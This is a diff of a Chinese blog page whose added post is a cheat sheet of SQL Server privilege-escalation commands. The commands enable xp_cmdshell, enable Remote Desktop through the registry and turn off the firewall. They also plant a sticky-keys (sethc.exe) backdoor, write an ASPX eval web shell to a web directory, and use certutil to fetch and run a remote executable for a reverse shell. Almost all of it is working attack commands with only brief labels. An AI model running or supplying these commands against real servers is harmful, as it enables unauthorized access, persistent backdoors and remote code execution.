@@ -51,16 +51,18 @@
   };
 </script>
 
-  <meta name="description" content="胡歌">
-<meta property="og:type" content="website">
-<meta property="og:title" content="ClearLoveの博客">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;tags&#x2F;MSF&#x2F;index.html">
+  <meta name="description" content="1、查看数据库版本select @@versionSQL server2005 以上xp_cmdshell默认没开启2、开启SQL server的xp_cmdshell功能">
+<meta name="keywords" content="sql server提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql server提权相关命令">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;sql-server%E6%8F%90%E6%9D%83&#x2F;index.html">
 <meta property="og:site_name" content="ClearLoveの博客">
-<meta property="og:description" content="胡歌">
+<meta property="og:description" content="1、查看数据库版本select @@versionSQL server2005 以上xp_cmdshell默认没开启2、开启SQL server的xp_cmdshell功能">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-02T08:36:23.859Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://yoursite.com/tags/MSF/">
+<link rel="canonical" href="http://yoursite.com/2019/12/02/sql-server%E6%8F%90%E6%9D%83/">
 
 
 <script id="page-configurations">
@@ -68,13 +70,13 @@
   CONFIG.page = {
     sidebar: "",
     isHome: false,
-    isPost: false,
+    isPost: true,
     isPage: false,
     isArchive: false
   };
 </script>
 
-  <title>标签: MSF | ClearLoveの博客</title>
+  <title>sql server提权相关命令 | ClearLoveの博客</title>
   
 
 
@@ -204,50 +206,144 @@
           <div class="content">
             
 
+  <div class="posts-expand">
+      
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h1 class="collection-header">MSF
-          <small>标签</small>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/02/sql-server%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="魏超">
+      <meta itemprop="description" content="胡歌">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ClearLoveの博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql server提权相关命令
         </h1>
-      </div>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2019-12-02 11:06:15 / 修改时间：16:36:23" itemprop="dateCreated datePublished" datetime="2019-12-02T11:06:15+08:00">2019-12-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8F%90%E6%9D%83/" itemprop="url" rel="index">
+                    <span itemprop="name">提权</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <h1 class="collection-header">2019</h1>
+        <p>1、查看数据库版本</p><pre><code>select @@version</code></pre><p>SQL server2005 以上xp_cmdshell默认没开启<br>2、开启SQL server的xp_cmdshell功能</p><a id="more"></a>
+
+
+<pre><code>exec sp_configure 'show advanced options', 1;reconfigure;
+exec sp_configure 'xp_cmdshell',1;reconfigure;</code></pre>
+<p>3、关闭SQL server的xp_cmdshell功能</p>
+<pre><code>exec sp_configure 'show advanced options', 1;reconfigure;
+exec sp_configure 'xp_cmdshell', 0;reconfigure</code></pre>
+<p>4、执行cmd命令</p>
+<pre><code>exec xp_cmdshell 'whoami';</code></pre>
+<p>5、若net user提示拒绝访问（命令意思为将net.exe赋予可执行权限）</p>
+<pre><code>exec xp_cmdshell 'echo y|cacls net.exe /g system:f';</code></pre>
+<p>6、是否开启远程桌面（1：表示关闭，0：表示开启）</p>
+<pre><code>EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\Terminal Server',
+'fDenyTSConnections'</code></pre>
+<p>7、读取远程桌面端口</p>
+<pre><code>EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp',
+'PortNumber'</code></pre>
+<p>8、开启远程桌面</p>
+<pre><code>EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer',
+'fDenyTSConnections','REG_DWORD',0;</code></pre>
+<p>9、通过上传3389.bat</p>
+<pre><code>echo Windows Registry Editor Version 5.00>>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg 
+echo "fDenyTSConnections"=dword:00000000>>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg 
+echo "PortNumber"=dword:00000d3d>>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg 
+echo "PortNumber"=dword:00000d3d>>3389.reg 
+regedit /s 3389.reg 
+del 3389.reg</code></pre>
+<pre><code>exec xp_cmdshell 'D:\WEB\3389.bat'</code></pre>
+<p>10.关闭防火墙</p>
+<pre><code>exec xp_cmdshell 'netsh firewall set opmode mode=disable'</code></pre>
+<p>11.sa无xp_cmdshell下的提权</p>
+<pre><code>declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';</code></pre>
+<pre><code>declare @oo int
+exec sp_oacreate 'scripting.filesystemobject', @oo out
+exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';</code></pre>
+<p>成功后3389登陆按五次shift键。成功进入服务器。<br>一直向上点”我的电脑“右键“管理” 用户管理直接加用户。<br>12.直接写shell</p>
+<pre><code>exec master..xp_cmdshell 'echo  ^<%@ page language="Jscript" %^>^<%eval(request.item["pass"],"unsafe");%^> > D:\web\upfile\affix\1.aspx'</%eval(request.item["pass"],"unsafe");%^></%@></code></pre>
+<p>13.下载远程的可执行文件，通过该方式可用于反弹shell</p>
+<pre><code># 下载恶意程序
+exec master.dbo.xp_cmdshell 'cd c:\\www & certutil -urlcache -split -f http://ip/file.exe';
+执行程序
+exec master.dbo.xp_cmdshell 'cd c:\\www & file.exe';</code></pre>
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2019-11-27T13:48:26+08:00"
-              content="2019-11-27">
-          11-27
-        </time>
-      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql-server%E6%8F%90%E6%9D%83/" rel="tag"># sql server提权</a>
+          </div>
 
-      <h2 class="post-title">
-          <a class="post-title-link" href="/2019/11/27/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/" itemprop="url">
-            <span itemprop="name">MSF内网渗透测试技巧</span>
-          </a>
-      </h2>
+        
 
-    </header>
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/11/28/windows-linux%E5%BF%AB%E9%80%9F%E6%8F%90%E6%9D%83/" rel="next" title="windows/linux快速提权">
+                  <i class="fa fa-chevron-left"></i> windows/linux快速提权
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+            </div>
+          </div>
+      </footer>
+    
   </article>
+  
+  
+  
 
-    </div>
   </div>
-  
-  
-  
-
-  
-
 
 
           </div>
